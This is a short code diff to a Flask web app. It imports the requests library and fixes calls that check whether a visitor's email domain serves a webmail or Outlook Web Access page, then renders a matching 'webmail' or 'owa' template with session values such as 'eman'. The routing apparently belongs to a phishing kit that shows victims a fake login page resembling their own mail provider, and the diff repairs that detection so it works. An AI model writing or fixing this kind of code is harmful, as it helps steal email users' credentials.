@@ -1,3 +1,4 @@
+import requests
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
@@ -187,11 +188,11 @@ def route2():
             owa_url2 = f"https://autodiscover.{domain}/owa/#path=/mail/search"
             
             try:
-                if request.get(webmail_url, timeout=3).status_code == 200:
+                if requests.get(webmail_url, timeout=3).status_code == 200:
                     return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-                if request.get(owa_url1, timeout=3).status_code == 200 or request.get(owa_url2, timeout=3).status_code == 200:
+                if requests.get(owa_url1, timeout=3).status_code == 200 or requests.get(owa_url2, timeout=3).status_code == 200:
                     return render_template('owa.html', eman=session['eman'], ins=session['ins'])
-            except request.RequestException:
+            except requests.RequestException:
                 pass
             
             # Render different templates based on domain
